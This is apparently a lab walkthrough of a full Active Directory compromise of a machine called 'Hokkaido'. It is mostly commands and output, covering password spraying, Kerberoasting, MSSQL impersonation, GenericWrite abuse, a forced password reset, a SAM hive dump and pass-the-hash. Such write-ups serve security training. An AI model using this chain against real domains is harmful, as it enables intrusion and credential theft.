#Windows #ActiveDirectory #Kerberoasting #TargetedKerberoasting #MSSQL #Impersonation #GenericWrite #SeBackupPrivilege #SAMDump #PassTheHash

## Overview

Hokkaido is an Active Directory domain controller running MSSQL. The attack chains four distinct techniques: kerbrute username enumeration discovers valid accounts, password spraying yields `info:info`, a NETLOGON share leaks an initial password, and Kerberoasting finds `maintenance`'s ticket but fails to crack it. The real path runs through MSSQL impersonation to access a restricted database, reading plaintext credentials for `hrapp-service` from a `sysauth` table. BloodHound then reveals `hrapp-service` has GenericWrite over `Hazel.Green`, enabling targeted Kerberoasting. Hazel's cracked hash leads to a password change for a Tier 1 admin, SeBackupPrivilege, and a SAM/SYSTEM dump that produces the Administrator NT hash.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com)
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The domain is `hokkaido-aerospace.com`, DC hostname is `dc.hokkaido-aerospace.com` (NetBIOS: HAERO). MSSQL on 1433 is notable alongside the standard DC service ports.

## Foothold

### Kerbrute Username Enumeration

Without credentials, kerbrute can enumerate valid Kerberos principals by timing AS-REQ responses:

```sh
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.126.40 \
  /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

[+] VALID USERNAME: info@hokkaido-aerospace.com
[+] VALID USERNAME: administrator@hokkaido-aerospace.com
[+] VALID USERNAME: discovery@hokkaido-aerospace.com
[+] VALID USERNAME: maintenance@hokkaido-aerospace.com
```

### Password Spraying, Username as Password

Spraying the discovered usernames against themselves is a quick check for "firstname equals password" patterns common in freshly-built lab domains:

```sh
nxc smb 192.168.126.40 --shares -u users.txt -p users.txt --continue-on-success
SMB  192.168.126.40  445  DC  [+] hokkaido-aerospace.com\info:info
```

Credentials:

```
info : info
```

### NETLOGON Share, Default Password Leak

Browsing SMB as `info` finds a non-default `homes` share with home directories for 21 users. The `NETLOGON` share contains a `temp` folder with a file:

```sh
cat password_reset.txt
Initial Password: Start123!
```

Spraying this password against all discovered users:

```sh
nxc smb 192.168.126.40 -u users.txt -p 'Start123!' --continue-on-success
SMB  192.168.126.40  445  DC  [+] hokkaido-aerospace.com\discovery:Start123!
```

Two credential pairs now:

```
info : info
discovery : Start123!
```

### Kerberoasting, Hash Acquired, Not Cracked

`discovery:Start123!` authenticates to the domain. Kerberoasting returns two tickets, `discovery` (already known) and `maintenance`. Hashcat finds no match for `maintenance`'s hash against rockyou.

## Privilege Escalation

### MSSQL Impersonation to Restricted Database

`discovery` authenticates to MSSQL. The default databases are accessible, but `hrappdb` is off-limits under this user:

```sh
impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@192.168.126.40 -dc-ip 192.168.126.40 -windows-auth
```

Querying for impersonatable logins:

```sql
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

Output:

```
hrappdb-reader
```

Switching context and accessing the restricted database:

```sql
EXECUTE AS LOGIN = 'hrappdb-reader';
USE hrappdb;
SELECT * FROM sysauth;
```

```
id   name              password
--   ----------------  ----------------
 0   hrapp-service     Untimed$Runny
```

> **How MSSQL impersonation works:** EXECUTE AS LOGIN changes the security context for the current session to that of another login, provided the current login has been granted IMPERSONATE on the target. It's a legitimate SQL Server feature for delegation, but when a low-privileged account can impersonate a higher-privileged one that can access sensitive databases, it becomes a lateral movement path. No password is required, the grant itself is the permission.

Credentials:

```
hrapp-service : Untimed$Runny
```

### BloodHound, GenericWrite to Targeted Kerberoast

BloodHound ingestion with `hrapp-service`'s credentials reveals: `hrapp-service` has **GenericWrite** over `Hazel.Green`, a Tier 2 admin account. GenericWrite allows writing arbitrary attributes on an AD object, including setting an SPN, which enables targeted Kerberoasting.

```sh
bloodhound-ce-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.126.40
```

Running targeted Kerberoast:

```sh
targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.126.40
```

Returns a TGS ticket for `Hazel.Green`. Cracking with hashcat:

```sh
hashcat -m 13100 hash --force /usr/share/wordlists/rockyou.txt
```

Credentials:

```
Hazel.Green : ‹redacted›
```

> **Targeted Kerberoasting via GenericWrite:** normally Kerberoasting only works against accounts that already have an SPN. GenericWrite lets the attacker set an SPN on any target account, making it Kerberoastable on demand. After extracting the TGS, the SPN can be removed to avoid traces. The attack was documented by Charlie Clark and Elad Shamir as part of DACL abuse research.

### IT Group → Password Reset → SeBackupPrivilege

BloodHound shows `Hazel.Green` belongs to the IT Group, which has permission to change passwords for Tier 1 admin users. Target: `Molly.Smith`.

```sh
rpcclient -N 192.168.126.40 -U 'hazel.green%haze1988'
rpcclient $> setuserinfo2 MOLLY.SMITH 23 'Password123!'
```

RDP as `molly.smith` with the new password (running CMD as administrator is critical):

```sh
xfreerdp /u:molly.smith /p:'Password123!' /v:192.168.126.40 +clipboard /drive:/home/kali
```

`whoami /priv` shows:

```
SeBackupPrivilege   Back up files and directories   Disabled
```

### SAM/SYSTEM Dump

SeBackupPrivilege allows reading any file on the system regardless of ACL, including the SAM and SYSTEM registry hives:

```cmd
reg save hklm\sam C:\Users\molly.smith\desktop\sam
reg save hklm\system C:\Users\molly.smith\desktop\system
```

Transfer the hives over the RDP-linked file share, then extract hashes locally:

```sh
impacket-secretsdump -system system -sam sam local
```

Pass the Administrator NT hash:

```sh
evil-winrm -i 192.168.126.40 -u administrator -H d752482897d54e239376fddb2a2109e4
```

## Root / SYSTEM

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
haero\administrator
```

## Takeaways

- **MSSQL impersonation is an underused lateral-move primitive.** The `EXECUTE AS LOGIN` grant is easy to miss without specifically querying `sys.server_permissions`. It can bridge from a low-privileged SQL login to a context that can read sensitive databases.
- **GenericWrite enables Kerberoasting on demand.** Any account writeable by the attacker becomes a Kerberoast target, even accounts without an SPN. This converts a generic AD write permission into a credential-cracking opportunity.
- **SeBackupPrivilege on a DC means full compromise.** The privilege bypasses all file ACLs, which means the SAM and SYSTEM hives are readable. Secretsdump then produces every local hash, including the built-in Administrator.
